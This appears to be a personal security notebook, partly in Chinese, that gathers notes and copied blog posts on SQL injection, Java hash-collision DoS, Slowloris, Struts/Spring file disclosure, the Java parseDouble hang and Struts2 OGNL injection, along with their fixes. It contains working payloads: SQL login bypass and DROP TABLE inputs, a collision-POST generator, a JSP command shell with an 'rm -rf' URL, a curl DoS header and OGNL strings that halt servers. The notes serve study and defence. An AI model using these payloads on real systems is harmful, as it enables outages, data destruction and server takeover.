@@ -1,0 +1,561 @@
+#+OPTIONS: "\n:t"
+
+* sql 注入
+** 举例
+#+begin_src java
+conn = pool.getConnection( );
+String sql = "select * from user where username='" + username +"' and password='" + password + "'";
+stmt = conn.createStatement();
+rs = stmt.executeQuery(sql);
+if (rs.next()) {
+loggedIn = true;
+	out.println("Successfully logged in");
+} else {
+	out.println("Username and/or password not recognized");
+}
+#+end_src
+
+username 被设置为:
+admin' OR '1'='1
+那么
+select * from user where username='admin' OR '1'='1' and password=' '
+sql语句执行成功。
+
+
+password 设置为
+x'; DROP TABLE members; --
+好了，
+select * from user where username='x' and password='x'; DROP TABLE members; --'
+数据表members被删除了。
+
+** 解决办法
+#+begin_src java
+String selectStatement = "SELECT * FROM User WHERE userId = ? ";
+PreparedStatement prepStmt = con.prepareStatement(selectStatement);
+prepStmt.setString(1, userId);
+ResultSet rs = prepStmt.executeQuery();
+#+end_src
+
+但是如下这样写，还是存在sql注入的问题
+#+begin_src java
+String strUserName = request.getParameter("Txt_UserName"); 
+PreparedStatement prepStmt = con.prepareStatement("SELECT * FROM user WHERE userId = '+strUserName+'");
+#+end_src
+
+* 哈希冲突攻击
+Hash collisions are a hell of a thing
+ 
+A few months ago, Julian Wälde and Alexander Klink presented at 28C3 about an exploit that can cause a server to see 99% CPU utilization. I hadn’t heard of the attack until a coworker of mine showed me the nruns article on the subject. We decided to have a little fun and see what we could do. This blog will show how to use a version of Julian and Alexander’s attack in Java.
+
+** A new attack you say?
+
+Actually, not quite. This attack was identified back in 2003, but it seems like it just disappeared even though just about every language has this weakness, since most of them use hashtables for POST parameters. Note that this isn’t even a distributed DoS! And that’s not even the best part - with any half-decent residential connection, you can likely transmit enough data to lock down entire servers. And no, I didn’t add an extra s to servers!
+
+** Hash collisions?
+
+The way many application servers work (from here on out I’ll focus on Java and Apache Tomcat, but this theory applies to many) when you submit parameters in a POST is to put them in a hash table. The default limit for POST request sizes is generally 2MB. What we’ll do next is show how to generate a message to bring a server to its knees.
+
+Non randomized hashcode functions are bad, mmk?
+
+The details of how Java hashcode works boils down to using DJBX33A with mutliplication constant 31 and a start value of 0, and if you’re interested, some Googling will show you details. For our purposes, it’s enough to know that the (extremely short) strings “Aa” and “BB” hash to the same value. (“C#” shares the hash too, but we’ll ignore it for our purposes) Even more importantly, there’s an easy way to generate permutations of these two tokens that will share a hash as well! Considering we have 2MB to work with, some math will show us that if we use 32-character long strings, we will be able to get a query constructed that causes 65,536 keys to hash to the same value! Since we’re using 2 character tokens, the number of permutations can be calculated with the formula 2^n, where n is the number of spots (16 in our case).
+
+You found colliding hashes! Congratulations!
+
+The key is that you’re generating ~65k keys that ALL hash to the same value, which makes processing take ridiculous amounts of time. My residential internet that costs less than $40 a month has 250KB/s upload. Trasmitting a 2MB POST at this rate takes a whopping eight seconds. So how long does this POST take to process? Inserting into a HashMap that has a key collision takes O(n^2) time. Since every single key we generate will collide, that’s 65k^2, which is a lot of comparisons.
+
+Stop talking, show me some cool stuff already
+
+Well, fine!
+#+begin_src java
+String[] tokens = {"Aa", "BB"};
+
+int spots = 16;
+
+// We'll keep track of permutations per "level" (amount of tokens)
+List<String>[] permutations = new ArrayList[spots];
+for (int i = 0; i < permutations.length; i++) {
+    permutations[i] = new ArrayList<String>();
+}
+
+// The first level of tokens is just "Aa" and "BB"
+for (int j = 0; j < 2; j++) {
+    permutations[0].add(tokens[j]);
+}
+
+// Generate all combinations with duplicates
+// First level: AaAa AaBB BBAa BBBB
+// Second level: AaAaAa AaAaBB AaBBAa AaBBBB ....
+for (int i = 1; i < spots; i++) {
+    for (String permutation : permutations[i-1]) {
+        // Yo dawg, I heard you like loops
+        for (int j = 0; j < 2; j++) {
+            String newPermutation = permutation + tokens[j];
+            permutations[i].add(newPermutation);
+        }
+    }
+}
+
+for (int i = 0; i < 59000; i++) {
+    System.out.println(permutations[permutations.length - 1].get(i) + "=1&");
+}
+#+end_src
+
+Like I mentioned earlier, Java’s hashing has an interesting property here. At any given level, EVERY combination generated will hash to the exact same thing. At the 16th level (32 bytes per key), we have 2^16 (65,536) combinations to work with. This gives us just over 2MB of keys. However, we can’t just submit a list of keys; we need values to tie them to. The smallest number of bytes then is is 35, which would be <key>=1&. So, 2^16 * 32 / 35 = 59,918. Leaving some extra room for fun, let’s call it 59,000 keys. So now, you can generate a POST that’s just at 2MB for our particular attack. Save that to a file, and then run:
+#+begin_example
+lwp-request -m POST localhost < attack.txt
+#+end_example
+at some interval. Congratulations on DoSing just about every Java application server on the Internet! I tried this locally, and with 59,000 arguments running through a Spring application, I locked one of my four cores at 100% for…
+
+wait for it…
+
+well, I don’t actually know. I got tired of waiting after 10 minutes had passed. I didn’t have my laptop’s power cable at home, and my battery was about to run out. However, it utilized 100% of the a core for at LEAST ten minutes. I’m tempted to try this on a production box, but I’ve been able to successfully channel my inner Good Guy Greg and refrain so far.
+
+Now what?
+
+Excellent question! If you’re running Tomcat, upgrade to either 7.0.23 or 6.0.35. These will limit the number of POST parameters to 10k, which Apache claims is small emough to prevent this attack. The article mentions a couple of other workarounds as well. The moral of the story is you can't trust the system should go make sure your application servers are up to date or implement a work around!
+
+Java sucks and you’re a bad person!
+
+Okay :(
+
+What about other languages?
+
+A 2MB POST takes SIX HOURS to parse in Ruby! Python by default limits POSTs to 1MB, but that still takes 7 minutes to parse! This is pretty much language agnostic if you can figure out a way to generate colliding hashes!
+
+Extra credit
+
+Careful readers will have noted the third colliding hash in the Java example (“C#”). As it turns out, you can do an attack with 3^n collisions instead of the one I demonstrated above at 2^n! This is obviously better as you can fit more (shorter) colliding keys into the same amount of space (2MB). For the theory behind that, definitely go check out the original presentation and nruns’ great article.
+
+* nginx 漏洞
+http://sebug.net/appdir/Nginx
+http://sebug.net/
+
+* 启明星辰的网址
+  可以看安全漏洞公告
+http://www.venustech.com.cn/
+* off by one 一个安全相关的网站
+http://blog.fortify.com/blog/
+* Apache Tomcat Slowloris工具拒绝服务漏洞
+临时解决方法：
+ 1. 通过server.xml内定义的连接器的connectionTimeout属性，配置一个合适的超时时间。
+ 2. 配置防火墙相关设置
+ 参考与该漏洞相类似的一个漏洞的防护方法的相关讨论，见
+ https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2007-6750
+ 厂商补丁：
+ Apache Group
+ ------------
+ 目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本
+
+* Slowloris
+攻击原理:
+攻击方先发送一个http header:
+GET / HTTP/1.1\r\n
+Host: Target host\r\n
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n
+Content-Length: 42\r\n
+结果就少了一个\r\n, Apache说: 我等!
+攻击方再发一坨X-a: b\r\n
+Apache已经找不到人生的目标了,继续等...,
+攻击方不停的新建连接，等到Apache连接数耗尽,目标达到
+
+受影响(affects)的httpd:
+    Apache 1.x/2.x, dhttpd, GoAhead WebServer, Squid, others...?
+不受影响(Not affects)的httpd:
+    IIS6.0,IIS7.0, lighty, others...?
+
+
+Slowloris有几个很重要的基本参数: 
+tcp connection timeout:默认5秒
+re-try timeout:默认100秒
+connections:1000
+Multithreading:Enabled
+剩下的就是perldoc ./slowloris.pl的事情了，没装perldoc直接去看文件末尾也能看懂
+* Application Frameworks and Static Analysis
+Last week you learned about some of the more advanced features in SCA and how they are used to support and identify vulnerabilities in application frameworks.  We also discussed dataflow analysis.  But dataflow analysis is not sufficient to adequately cover application frameworks.  One has to look at the application framework with a discerning eye and identify vulnerabilities in the framework which are specific to the use of that framework.   This week we will shift gears and start looking at framework specific vulnerabilities.  
+Framework Specific Vulnerabilities (Error Prone APIs)
+
+Framework specific vulnerabilities relate to coding constructs or security holes which are created by well meaning developers (usually in the name of productivity enhancements) which allow a new and .  Struts 2 has the following:  over exposed request bound objects, inconsistent model on the value-stack, value-stack shadowing, file upload DOS, file disclosure, blended threats, default stack vulnerabilities, under inclusive exception handling, exposed *Aware interfaces, exposed methods (most privilege), framework specific race conditions, OGNL script injection, and file download vulnerabilities.
+
+I obviously cannot go through all of the vulnerabilities identified above but let’s look at framework specific file disclosure.
+Framework Specific File Disclosure
+
+Framework specific file disclosure is a vulnerability where an attacker can download any file that is part of the application, remotely or execute files are the server remotely.  The files that are downloadable are configuration files (web.xml, applicationContext.xml, default.properties, etc.), jar files (any jar files in the WEB-INF/lib directory), and class files (any class under the /WEB-INF/classes directory).  It was originally discovered in a constructor argument to Spring MVC’s ModelAndView(…) object by Ryan Berg and Dinis Cruz (http://o2platform.files.wordpress.com/2011/07/ounce_springframework_vulnerabilities.pdf).  Ryan and Dinis had discovered this vulnerability in the Spring MVC framework but this is a serious vulnerability which exists in many MVC frameworks.  Here is what the vulnerability looks like across different frameworks:
+
+ 
+
+//Struts 1.x given you are in an Action method …
+
+String dest = request.getParameter(“url”);
+
+return ActionForward(dest);
+
+ 
+
+//Struts 2.x which is a bit more complicated because it includes the 
+
+//configuration file below
+
+Public class ProcessOrderAction {
+
+Private String dest;
+
+//public getter and setters omitted
+
+…
+
+ 
+
+//Struts 2.x configuration file
+
+<action name=”ProcessOrder_*” method=”{1}” class=”ProcessOrderAction” >
+
+     <result name=”success”> ${dest} </result>
+
+…
+
+ 
+
+Or 
+
+ 
+
+<%-- in a Struts JSP page --%>
+
+<s:include value=”${param.dest}” />
+
+ 
+
+Or
+
+ 
+
+<%-- in a JEE JSP page --%>
+
+<jsp:include page=”${param.dest}” />
+
+<jsp:forward page=”${param.dest}” />
+
+ 
+
+Or 
+
+ 
+
+//Spring 3 annotated method
+
+@RequestMapping (“/processOrder”)
+
+public String processMyOrder(@RequestParam String dest, @RequestParam String id, @ModelAttribute Order order) {
+
+…
+
+return dest;
+
+ 
+
+Or 
+
+ 
+
+//In a servlet
+
+String dest = request.getParameter(“dest”);
+
+RequestDispatcher rd = request.getRequestDispatcher(dest);
+
+rd.forward(req, res);
+
+ 
+
+I could go on and on but you get my drift.  
+
+To exploit this vulnerability you can either pass in the full path to the file you want or utilize path parameters.
+
+When the dest is directly being used you can pass in:
+
+http://www.yourserver.com/webApp/logic?dest=/WEB-INF/web.xml
+
+In other cases you may need to pass in 
+
+http://www.yourserver.com/webApp/logic?dest=forward:/WEB-INF/web.xml
+
+and finally you may need to pass in 
+
+http://www.yourserver.com/webApp/logic?dest=../WEB-INF/web.xml;test=
+
+this is due to the funny way Spring MVC resolves views.
+
+If you return a string from a @RequestMapped method it will pass the string to an InternalResourceViewResolver.  A typical view resolver is configured as follows:
+
+<bean id="viewResolver" class="org.springframework.web.servlet.view.InternalResourceViewResolver">
+
+        <property name="prefix" value="/WEB-INF/jsp/"/>
+
+        <property name="suffix" value=".jsp"/>
+
+</bean>
+
+ 
+
+The way this works is that the string returned from a request mapped method is pre-pended with the prefix and post-pended with the suffix.  So if “processOrder” is returned from:
+
+//Spring 3 annotated method
+
+@RequestMapping (“/processOrder”)
+
+public String processMyOrder(@RequestParam String dest, @RequestParam String id, @ModelAttribute Order order) {
+
+…
+
+return “processOrder”;
+
+…
+
+Then the request is forwarded to “/WEB-INF/jsp/processOrder.jsp”.
+
+To subvert the prefix and suffix the attacker can use path parameters.  Path parameters are parameters passed in after the “;” (semicolon) in a URL.
+
+So the attacker can return “../web.xml;test=x” which will forward the request to:
+
+/WEB-INF/jsp/../web.xml;test=x.jsp
+
+This request returns the web.xml file in the browser and test=x.jsp is treated as a path parameter.
+
+If you see the following and think you are safe then you would be wrong depending on the app server you are running:
+
+return new ActionForward(“/WEB-INF/jsp/someFile.jsp?param=” +
+
+req.getParameter(“input”) );
+
+Normally an attacker would not be able to exploit this as a file disclosure but if the application was running on certain versions of tomcat an attacker could still successfully carry out the file disclosure attack even if only appending a request parameter value.
+
+According to CVE-2008-2370, “Apache Tomcat 4.1.0 through 4.1.37, 5.5.0 through 5.5.26, and 6.0.0 through 6.0.16, when a RequestDispatcher is used, performs path normalization before removing the query string from the URI, which allows remote attackers to conduct directory traversal attacks and read arbitrary files via a .. (dot dot) in a request parameter.”
+
+So the attacker could pass in “/../../web.xml” and the web.xml would be displayed as the URL would look like the following:
+
+/WEB-INF/jsp/someFile.jsp?param=/../../web.xml
+
+Which gets canonicalized down to:
+
+/WEB-INF/web.xml
+
+But you may say, “What is the big deal if I reveal some configuration files especially if there is no confidential data in them.”  There are two reasons why the file disclosure is especially bad:  1. The attacker can download your intellectual property including class files and jar files within your application.  2.  This attack can be combined with a file upload vulnerability (as a server side blended attack) to allow an attacker to execute arbitrary system level commands.
+
+The book, Struts 2 Design and Programming: A Tutorial by Budi Kurniawan provide a file upload example code similar to the following:
+
+ 
+
+public class FileUploadAction extends ActionSupport {
+
+private File attachment;
+
+private String attachmentFileName;
+
+private String attachmentContentType;
+
+public String upload() throws Exception {
+
+     ServletContext sc = ServletActionContext.getServletContext();
+
+     String uploadDir = sc.getRealPath(“/WEB-INF”);
+
+     uploadedDir = uploadedDir + “/uploadedFiles”;
+
+     File savedFile = new File(uploadedDir, attachmentFileName);
+
+     Attachment.renameTo(savedFile);
+
+}
+
+I tried getting “..\” into the attachmentFileName without success because the “..” were getting filtered by the Apache Commons File Upload component.  So if we assume that you could NOT do a path manipulation attack, why is this code important to the file disclosure vulnerability?
+
+…
+
+What if an attacker could upload a JSP file with the following body:
+
+ 
+
+// From body of commandProxy.jsp
+
+<%  
+
+Runtime rt = Runtime.getRuntime();
+
+rt.exec(request.getParameter(“osCommand”));
+
+%>
+
+ 
+
+Then the attacker could use the file disclosure vulnerability in the following way.
+
+http://www.yourserver.com/webApp/logic?dest=/WEB-INF/uploadedFiles/commandProxy.jsp?osCommand=rm%20–rf%20*
+
+The attacker now has the ability to pown your server.
+Conclusion
+
+I have only scratched the surface as to researching and exploiting application frameworks. All of the vulnerabilities I described above can be found with the static analysis rules I described above.   I hope I highlighted why you can count on Fortify to cover application frameworks and gave you insight into how we work.  Some of the rule scripting techniques I described are currently only supported for internal use, however plans are in the works to expand the custom rules documentation to put the power of rules scripting into your hands.  Once you see what you can do with custom rules and scripting, prepare yourself to be amazed.
+
+ 
+
+
+* http://stackoverflow.com
+* curl -H 'Accept-Language: en-us;q=2.2250738585072012e-308' http://example.org
+ Accept-Language: da, en-gb;q=0.022250738585072012e-00306, en;q=0.022250738585072012e-00306
+* Java Denial of Service Vulnerability
+
+Java Denial of Service Vulnerability (Double Trouble)
+« Fortify at RSA Conference 2011 | Main | Introducing Real-Time Hybrid Correlation: SAST-DAST Issue Correlation » 
+The Back Story
+ Most versions of Java and some versions of PHP enter an infinite loop trying to turn the string "2.2250738585072012e-308" into a double precision floating point value. (Remember scientific notation? Floats and doubles are good for representing really big and really small numbers. Very important for getting the physicists to shell out for supercomputers.) Here are the details on the bugs. 
+
+ This is a recipe for a quick and easy denial of service attack. If you have a Java application that does something as simple as this:
+     Double.parseDouble(request.getParameter("d"));
+ attackers can wedge a thread every time they make an HTTP request. Now Anonymous doesn't need a botnet army to take your app offline. A laptop with an AOL dialup connection should be plenty. 
+
+ From a language perspective, the situation for PHP is worse because of PHP's type coercion (Looks like a double? Parse it like a double.) But only versions 5.2 and 5.3 of PHP are vulnerable, and the PHP team released a patch last month. 
+
+ For Java, the problem isn't a single number. There is a small range of numbers that cause the conversion to hang. But there are lots of ways to write any given floating point number, so those itty-bitty numbers turn into an enormous volume of potential input strings. (For example, the strings "2.2250738585072012e-308" and "0.022250738585072012e-00306" are equally problematic.) The upshot is that an attack is difficult to block from the network layer without catching some legitimate values too. 
+
+The Tomcat Twist
+ Think you're not vulnerable because your program doesn't use any doubles? Wrong answer. Tomcat uses parseDouble() on the value of the Accept-Language HTTP header when an application calls request.getLocale(). If your application takes locale into account, chances are it's vulnerable. This isn't the only under-the-covers place doubles are lurking, so the absence of direct calls to methods such as Double.parseDouble() or Double.valueOf() doesn't mean you're guaranteed safe. And chances are good Tomcat isn't the only bit of Java middleware or framework code that uses a double. 
+
+The Punchline
+ This bug is an excellent example of the evolving software security landscape. Until this problem came along, calling parseDouble() looked like an ideal way to validate input. Now parseDouble() is yet another weak point to protect. And so it goes. When you ship software, you have to make sure it's protected against the risks we know about today. But when you wake up tomorrow, new risks may well have emerged during the night. Building secure systems means more than just avoiding foreseeable mistakes. It means preparing for the unforeseeable too. That means being ready to respond when new vulnerabilities emerge. 
+
+Next Steps
+ Oracle and Tomcat have released patches this week. We expect other Java providers (such as IBM) to follow suit. But it will be quite a while before those fixes are widely deployed. Until then, here's what we're doing: 
+We have released a Fortify Real-Time Analyzer (RTA) rulepack that protects against the attack at the code level. It monitors calls to the underlying class and flags calls that will cause the thread to hang. If desired, it can patch the code so that the vulnerability no longer exists. All without taking the app offline. Just saying. 
+Next week the HP Application Security Center (ASC) will release a check for WebInspect so that vulnerable applications can be identified during security testing. 
+The next Fortify Secure Coding Rulepack update for SCA (to be released at the end of February) will include static analysis rules to detect code that is vulnerable to an attack on methods such as parseDouble() and getLocale().
+
+
+* A Closer Look at the Java 2.2250738585072012e-308 Bug
+By Rick Regan (Published February 7th, 2011) 
+
+Java’s decimal to floating-point conversion routine, the doubleValue() method of its FloatingDecimal class, goes into an infinite loop when converting the decimal string 2.2250738585072012e-308 to double-precision binary floating-point. I took a closer look at the bug, by tracing the doubleValue() method in the Eclipse IDE for Java (thanks to Konstantin Preißer for helping me set that up). What I found was that our initial analysis of the bug was wrong; what actually happens is that doubleValue()’s correction loop oscillates between two values, 0x1p-1022 and 0x0.fffffffffffffp-1022.
+
+The Failing Code in doubleValue()
+
+This section of code in the correction loop of doubleValue() is where the infinite loop manifests itself:
+} else {
+    // difference is non-trivial.
+    // could scale addend by ratio of difference to
+    // halfUlp here, if we bothered to compute that difference.
+    // Most of the time ( I hope ) it is about 1 anyway.
+    dValue += ulp( dValue, overvalue );
+    if ( dValue == 0.0 || dValue == Double.POSITIVE_INFINITY )
+        break correctionLoop; // oops. Fell off end of range.
+    continue; // try again.
+}
+
+(This code is from JDK 6 Update 23; it lives in file j2se/src/share/classes/sun/misc/FloatingDecimal.java.)
+
+To see the value of ulp() and the before and after values of dValue, I inserted printf() statements to view them as hexadecimal floating point constants.
+Odd Numbered Passes of the Loop
+
+These are the values of ulp() and dValue for the first, third, fifth, etc. time through the highlighted line of code:
+ulp():                      -0x0.0000000000001p-1022
+dValue before adding ulp():  0x1.0p-1022
+dValue after adding ulp():   0x0.fffffffffffffp-1022
+
+In other words, 2-1074 is subtracted from 2-1022, giving
+
+1.111111111111111111111111111111111111111111111111111 x 2-1023.
+Even Numbered Passes of the Loop
+
+These are the values of ulp() and dValue for the second, fourth, sixth, etc. time through the highlighted line of code:
+ulp():                       0x0.0000000000001p-1022
+dValue before adding ulp():  0x0.fffffffffffffp-1022
+dValue after adding ulp():   0x1.0p-1022
+
+In other words, 2-1074 is added to
+
+1.111111111111111111111111111111111111111111111111111 x 2-1023, giving
+
+2-1022. Now the correction loop is right back where it started. 
+The Initial Estimate Was Correct
+
+The initial value of dValue was correct — it needed no adjustment. Therein lies the problem.
+An Old Suggested Fix
+
+In OpenJDK bug report 100119 — an earlier report of what turns out to be the same bug — there is a suggested one line of code fix: change this line of code in the correction loop
+if ( (bigIntNBits == 1) && (bigIntExp > -expBias) ){
+
+to
+if ( (bigIntNBits == 1) && (bigIntExp > -expBias+1) ){
+
+I tried it out, as did Konstantin; it stops the infinite loop and returns the correctly rounded result. Before the fix, the ‘if’ statement evaluates to true (and continues to do so on every odd numbered pass of the loop): bigIntExp=-1022 and -expBias=-1023. Adding one to -expBias makes the ‘if’ condition false, which leads to no adjustment — and an exit from the loop.
+Is The Fix Correct?
+
+The suggested fix works for this case — but does it work in all cases? We’ll have to wait and see what the Java experts have to say about it.
+This is Not the Same as the PHP Bug
+
+PHP’s decimal to floating-point conversion routine went into an infinite loop for a different number, a number just below the normal/subnormal number boundary: 2.2250738585072011e-308. The fix was to add the ‘volatile’ keyword to a variable used in the adjustment of the converted result. This addressed an issue related to how the code ran on the x87 architecture.
+
+PHP’s decimal to floating-point conversion routine is C code — it is a version of David Gay’s strtod() function. Java’s decimal to floating-point conversion routine is java code, although obviously modeled on David Gay’s C code. Apparently, it was changed just enough to avoid the x87 error — but it introduced a new error.
+
+
+* Java Hangs When Converting 2.2250738585072012e-308
+By Rick Regan (Published January 31st, 2011) 
+
+Konstantin Preißer made an interesting discovery, after reading my article “PHP Hangs On Numeric Value 2.2250738585072011e-308”: Java — both its runtime and compiler — go into an infinite loop when converting the decimal number 2.2250738585072012e-308 to double-precision binary floating-point. This number is supposed to convert to 0x1p-1022, which is DBL_MIN; instead, Java gets stuck, oscillating between 0x1p-1022 and 0x0.fffffffffffffp-1022, the largest subnormal double-precision floating-point number.
+
+Send a Java Program Into An Infinite Loop
+
+Compile this program and run it; the program will hang (at least it does on a 32-bit system with the latest JRE/JDK):
+class runhang {
+public static void main(String[] args) {
+  System.out.println("Test:");
+  double d = Double.parseDouble("2.2250738585072012e-308");
+  System.out.println("Value: " + d);
+ }
+}
+Send the Java Compiler Into An Infinite Loop
+
+Try to compile this program; the compiler will hang:
+class compilehang {
+public static void main(String[] args) {
+  double d = 2.2250738585072012e-308;
+  System.out.println("Value: " + d);
+ }
+}
+Where’s the Problem?
+
+For the runtime case at least, Konstantin has narrowed the problem down to the “correction loop” in FloatingDecimal.java. See his comments on my PHP bug analysis article.
+
+Like PHP, Java gets stuck crossing the normalized/unnormalized border, but in the opposite direction: it starts with an estimate just below DBL_MIN — 0x0.fffffffffffffp-1022 — and is trying to get up to DBL_MIN. but with a twist: it starts with an estimate that is correct — DBL_MIN — and then adjusts it to 0x0.fffffffffffffp-1022. It then adjusts that back to DBL_MIN, and around it goes…
+Bug Report
+
+Konstantin reported this problem to Oracle three weeks ago, but is still waiting for a reply. (Update: as per Konstantin’s comment below, the bug has been assigned “internal review ID of 1949967, which is NOT visible on the Sun Developer Network (SDN)”.)
+Update: Previous Bug Reports Describe the Same Problem
+
+Readers found two bug reports that describe the same problem (although not in terms of the magic number 2.2250738585072012e-308): bug number 100119 from 2009, and bug number 4421494 from 2001. (But don’t bother clicking on that last one — the link is now dead, as of 2/3/11.)
+Addendum
+
+As pointed out in the comments below, equivalent forms of the number cause the problem as well; examples:
+0.00022250738585072012e-304 (decimal point placement)
+00000000002.2250738585072012e-308 (leading zeros)
+2.225073858507201200000e-308 (trailing zeros)
+2.2250738585072012e-00308 (leading zeros in the exponent)
+2.2250738585072012997800001e-308 (superfluous digits beyond digit 17)
+
+* Struts2漏洞
+Struts2的核心是使用的WebWork，处理Action时通过ParametersInterceptor（参数过滤器）调用Action的getter/setter方法来处理http的参数，它将每个http参数声明为一个ONGL语句。 
+例如：
+1、请求参数
+    ?company.name=AILK&level=no1
+2、经ONGL转义后，在Action中执行代码如下：
+    getCompany.setName("AILK") 
+    setLevel("no1") 
+ 
+例如：
+在请求Action中带上如下参数：
+?('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&(aaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew%20java.lang.Boolean("false")))&(asdf)(('\u0023rt.sleep(999999999)')(\u0023rt\u003d@java.lang.Thread@currentThread()))=1
+ 
+
+或者
+?('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&(aaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew%20java.lang.Boolean("false")))&(asdf)(('\u0023rt.exit(1)')(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1
+
+
+可以停止当前Action所在的J2EE服务器（Tomcat, Resin, WebLogic，……）。
